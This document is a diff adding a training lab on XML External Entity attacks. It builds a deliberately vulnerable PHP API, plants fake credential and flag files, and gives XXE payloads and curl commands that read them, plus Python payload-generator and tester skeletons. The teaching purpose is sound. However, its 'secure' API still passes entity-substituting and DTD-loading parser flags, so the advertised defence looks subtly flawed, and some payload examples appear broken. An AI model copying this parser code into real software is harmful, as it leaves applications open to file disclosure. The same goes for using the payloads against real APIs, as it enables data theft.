@@ -1,0 +1,476 @@
+XXE Attacks on Vulnerable XML APIs
+Objectives
+By the end of this lab, students will be able to:
+
+Understand XML External Entity (XXE) vulnerabilities and their security impact
+Identify and exploit XXE vulnerabilities in XML-processing APIs
+Implement various XXE attack techniques including file disclosure and SSRF
+Develop Python scripts to automate XXE payload generation and testing
+Apply proper defenses against XXE attacks in web applications
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of XML structure and syntax
+Familiarity with HTTP requests/responses and web APIs
+Basic Python programming skills
+Understanding of Linux command line operations
+Lab Environment
+This lab uses Al Nafi's pre-configured Linux cloud machines with all necessary tools installed. Click Start Lab to access your environment. The lab includes PHP, Python 3, curl, and text editors.
+
+Task 1: Setting Up the Vulnerable XML API
+Step 1: Create the Lab Directory Structure
+mkdir -p /home/student/xxe-lab
+cd /home/student/xxe-lab
+Step 2: Create a Vulnerable PHP API
+Create vulnerable_api.php:
+
+<?php
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = file_get_contents('php://input');
+    
+    // VULNERABLE: External entities enabled
+    libxml_disable_entity_loader(false);
+    $dom = new DOMDocument();
+    $dom->loadXML($input, LIBXML_NOENT | LIBXML_DTDLOAD);
+    
+    $users = $dom->getElementsByTagName('user');
+    $result = [];
+    
+    foreach ($users as $user) {
+        $name = $user->getElementsByTagName('name')->item(0);
+        $email = $user->getElementsByTagName('email')->item(0);
+        
+        if ($name && $email) {
+            $result[] = [
+                'name' => $name->nodeValue,
+                'email' => $email->nodeValue
+            ];
+        }
+    }
+    
+    echo json_encode(['users' => $result]);
+} else {
+    echo json_encode(['message' => 'Send POST request with XML data']);
+}
+?>
+Step 3: Create Test Files
+# Create sensitive files for testing
+echo "admin:x:0:0:root:/root:/bin/bash" > /tmp/passwd.fake
+echo "user:x:1000:1000:User:/home/user:/bin/bash" >> /tmp/passwd.fake
+
+mkdir -p /home/student/sensitive
+cat > /home/student/sensitive/config.txt << 'EOF'
+DATABASE_PASSWORD=super_secret_123
+API_KEY=sk-1234567890abcdef
+SECRET_TOKEN=jwt_secret_xyz789
+EOF
+
+echo "FLAG{xxe_vulnerability_discovered}" > /home/student/sensitive/flag.txt
+Step 4: Start the Web Server
+php -S localhost:8080 &
+Verify the server is running:
+
+curl http://localhost:8080/vulnerable_api.php
+Task 2: Exploiting XXE Vulnerabilities
+Step 1: Test Basic XXE Attack
+Create xxe_basic.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///tmp/passwd.fake">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>test@example.com</email>
+    </user>
+</users>
+Test the payload:
+
+curl -X POST -H "Content-Type: application/xml" \
+  -d @xxe_basic.xml http://localhost:8080/vulnerable_api.php | jq .
+Expected Result: The response should contain contents of /tmp/passwd.fake in the name field.
+
+Step 2: Extract Sensitive Configuration
+Create xxe_config.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///home/student/sensitive/config.txt">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>config@example.com</email>
+    </user>
+</users>
+Test:
+
+curl -X POST -H "Content-Type: application/xml" \
+  -d @xxe_config.xml http://localhost:8080/vulnerable_api.php | jq .
+Step 3: Retrieve the Flag
+Create xxe_flag.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///home/student/sensitive/flag.txt">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>flag@example.com</email>
+    </user>
+</users>
+Test:
+
+curl -X POST -H "Content-Type: application/xml" \
+  -d @xxe_flag.xml http://localhost:8080/vulnerable_api.php | jq .
+Task 3: Advanced XXE Techniques
+Step 1: Parameter Entity Attack
+Create xxe_parameter.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+    <!ENTITY % file SYSTEM "file:///home/student/sensitive/config.txt">
+    <!ENTITY % eval "<!ENTITY &#x25; data SYSTEM 'file:///tmp/passwd.fake'>">
+    %eval;
+]>
+<users>
+    <user>
+        <name>Parameter Test</name>
+        <email>param@example.com</email>
+    </user>
+</users>
+Step 2: UTF-16 Encoding Bypass
+Create xxe_utf16.xml:
+
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///home/student/sensitive/flag.txt">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>utf16@example.com</email>
+    </user>
+</users>
+Step 3: Test Protected API
+Create protected_api.php:
+
+<?php
+header('Content-Type: application/json');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = file_get_contents('php://input');
+    
+    // PROTECTED: External entities disabled
+    libxml_disable_entity_loader(true);
+    $dom = new DOMDocument();
+    
+    try {
+        $dom->loadXML($input, LIBXML_NOENT);
+        echo json_encode(['status' => 'protected', 'message' => 'External entities disabled']);
+    } catch (Exception $e) {
+        echo json_encode(['error' => 'XML parsing failed']);
+    }
+}
+?>
+Test both APIs with the same payload to observe the difference.
+
+Task 4: Automating XXE Attacks with Python
+Step 1: Create XXE Payload Generator
+Create xxe_generator.py:
+
+#!/usr/bin/env python3
+"""
+XXE Payload Generator
+Students: Complete the missing functions to generate various XXE payloads
+"""
+
+import sys
+import argparse
+
+class XXEPayloadGenerator:
+    def __init__(self):
+        self.payloads = []
+    
+    def generate_basic_xxe(self, file_path, element="name"):
+        """
+        Generate a basic XXE payload for file reading.
+        
+        Args:
+            file_path: Target file path to read
+            element: XML element to inject the entity into
+        
+        Returns:
+            String containing the XXE payload
+        
+        TODO: Implement the basic XXE payload generation
+        Hint: Use DOCTYPE declaration with ENTITY definition
+        """
+        # TODO: Create XML with DOCTYPE and ENTITY
+        # TODO: Reference the entity in the specified element
+        # TODO: Return the complete XML payload
+        pass
+    
+    def generate_parameter_entity(self, file_path):
+        """
+        Generate parameter entity XXE payload.
+        
+        Args:
+            file_path: Target file path
+        
+        Returns:
+            String containing parameter entity payload
+        
+        TODO: Implement parameter entity payload
+        """
+        # TODO: Create parameter entity definition
+        # TODO: Use % notation for parameter entities
+        pass
+    
+    def generate_blind_xxe(self, callback_url, file_path):
+        """
+        Generate blind XXE payload with external callback.
+        
+        Args:
+            callback_url: URL to receive the exfiltrated data
+            file_path: Target file to exfiltrate
+        
+        Returns:
+            String containing blind XXE payload
+        
+        TODO: Implement blind XXE with external DTD
+        """
+        # TODO: Create external DTD reference
+        # TODO: Include callback URL in entity definition
+        pass
+    
+    def save_payload(self, payload, filename):
+        """Save payload to file"""
+        with open(filename, 'w') as f:
+            f.write(payload)
+        print(f"[+] Payload saved to {filename}")
+
+def main():
+    parser = argparse.ArgumentParser(description='XXE Payload Generator')
+    parser.add_argument('--type', choices=['basic', 'parameter', 'blind'], 
+                       required=True, help='Payload type')
+    parser.add_argument('--file', required=True, help='Target file path')
+    parser.add_argument('--output', help='Output filename')
+    parser.add_argument('--callback', help='Callback URL for blind XXE')
+    
+    args = parser.parse_args()
+    
+    generator = XXEPayloadGenerator()
+    
+    # TODO: Implement payload generation based on type
+    # TODO: Save payload to file if output specified
+    # TODO: Print payload to stdout
+    
+    print("[!] Complete the implementation")
+
+if __name__ == "__main__":
+    main()
+Step 2: Create Automated XXE Tester
+Create xxe_tester.py:
+
+#!/usr/bin/env python3
+"""
+Automated XXE Vulnerability Tester
+Students: Complete the testing functions
+"""
+
+import requests
+import json
+import sys
+
+class XXETester:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.results = []
+    
+    def test_payload(self, payload, description):
+        """
+        Test a single XXE payload against the target.
+        
+        Args:
+            payload: XML payload string
+            description: Test description
+        
+        Returns:
+            Dictionary with test results
+        
+        TODO: Implement payload testing
+        """
+        print(f"\n[*] Testing: {description}")
+        
+        # TODO: Send POST request with XML payload
+        # TODO: Parse response and check for sensitive data
+        # TODO: Detect successful exploitation
+        # TODO: Return results dictionary
+        pass
+    
+    def detect_sensitive_data(self, response_text):
+        """
+        Detect if response contains sensitive data.
+        
+        Args:
+            response_text: Response body text
+        
+        Returns:
+            Boolean indicating if sensitive data found
+        
+        TODO: Implement sensitive data detection
+        """
+        # TODO: Check for common sensitive patterns
+        # TODO: Look for file contents, passwords, flags
+        # TODO: Return True if sensitive data detected
+        pass
+    
+    def run_test_suite(self, target_files):
+        """
+        Run comprehensive XXE tests.
+        
+        Args:
+            target_files: List of file paths to test
+        
+        TODO: Implement comprehensive testing
+        """
+        # TODO: Generate payloads for each file
+        # TODO: Test each payload type (basic, parameter, etc.)
+        # TODO: Collect and store results
+        pass
+    
+    def generate_report(self):
+        """
+        Generate summary report of test results.
+        
+        TODO: Implement report generation
+        """
+        # TODO: Calculate success rate
+        # TODO: List successful exploits
+        # TODO: Provide recommendations
+        pass
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 xxe_tester.py <target_url> [file1] [file2] ...")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    target_files = sys.argv[2:] or ["/tmp/passwd.fake", "/home/student/sensitive/flag.txt"]
+    
+    # TODO: Create tester instance
+    # TODO: Run test suite
+    # TODO: Generate report
+
+if __name__ == "__main__":
+    main()
+Step 3: Test Your Implementation
+# Make scripts executable
+chmod +x xxe_generator.py xxe_tester.py
+
+# Test payload generator (after implementation)
+python3 xxe_generator.py --type basic --file /tmp/passwd.fake --output test_payload.xml
+
+# Test automated tester (after implementation)
+python3 xxe_tester.py http://localhost:8080/vulnerable_api.php
+Task 5: Implementing XXE Defenses
+Step 1: Create Secure API
+Create secure_api.php:
+
+<?php
+header('Content-Type: application/json');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = file_get_contents('php://input');
+    
+    // SECURE: Disable external entities
+    libxml_disable_entity_loader(true);
+    
+    // Use secure parser configuration
+    $dom = new DOMDocument();
+    $dom->resolveExternals = false;
+    $dom->substituteEntities = false;
+    
+    // Load XML without processing external entities
+    $success = @$dom->loadXML($input, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NONET);
+    
+    if (!$success) {
+        echo json_encode(['error' => 'Invalid XML']);
+        exit;
+    }
+    
+    // Process only expected elements
+    $users = $dom->getElementsByTagName('user');
+    $result = [];
+    
+    foreach ($users as $user) {
+        $name = $user->getElementsByTagName('name')->item(0);
+        $email = $user->getElementsByTagName('email')->item(0);
+        
+        if ($name && $email) {
+            // Sanitize output
+            $result[] = [
+                'name' => htmlspecialchars($name->nodeValue),
+                'email' => filter_var($email->nodeValue, FILTER_SANITIZE_EMAIL)
+            ];
+        }
+    }
+    
+    echo json_encode(['users' => $result, 'secure' => true]);
+}
+?>
+Step 2: Test Secure Implementation
+# Test secure API with XXE payload
+curl -X POST -H "Content-Type: application/xml" \
+  -d @xxe_basic.xml http://localhost:8080/secure_api.php | jq .
+Expected Result: The secure API should reject or safely handle the XXE payload without exposing file contents.
+
+Step 3: Compare Vulnerable vs Secure
+Create a comparison script compare_apis.sh:
+
+#!/bin/bash
+
+echo "Testing Vulnerable API:"
+curl -s -X POST -H "Content-Type: application/xml" \
+  -d @xxe_flag.xml http://localhost:8080/vulnerable_api.php | jq .
+
+echo -e "\nTesting Secure API:"
+curl -s -X POST -H "Content-Type: application/xml" \
+  -d @xxe_flag.xml http://localhost:8080/secure_api.php | jq .
+Expected Outcomes
+After completing this lab, you should have:
+
+Successfully exploited XXE vulnerabilities to read local files
+Retrieved sensitive data including passwords and configuration files
+Captured the flag: FLAG{xxe_vulnerability_discovered}
+Implemented Python scripts for automated XXE testing
+Created and tested secure XML parsing implementations
+Understood the difference between vulnerable and secure XML processing
+Troubleshooting Tips
+Issue: Server not responding
+
+Solution: Check if PHP server is running with ps aux | grep php. Restart with php -S localhost:8080 &
+Issue: Permission denied reading files
+
+Solution: Ensure test files exist and are readable. Use ls -la to check permissions.
+Issue: JSON parsing errors
+
+Solution: Verify XML syntax is correct. Use xmllint --noout file.xml to validate XML.
+Issue: Python scripts not working
+
+Solution: Install required packages: pip3 install requests. Check Python version with python3 --version.
+Conclusion
+This lab demonstrated XML External Entity (XXE) vulnerabilities in web APIs. You learned to identify vulnerable XML parsers, exploit XXE to access sensitive files, automate attacks with Python, and implement proper defenses. Key takeaways:
+
+Always disable external entity processing in XML parsers
+Use secure parser configurations and input validation
+Implement allowlists for acceptable XML content
+Regular security testing helps identify XXE vulnerabilities
+Defense-in-depth approach: combine multiple security controls
+XXE remains a critical vulnerability in modern applications. Apply these defensive techniques in production systems to prevent data exposure and server-side request forgery attacks.
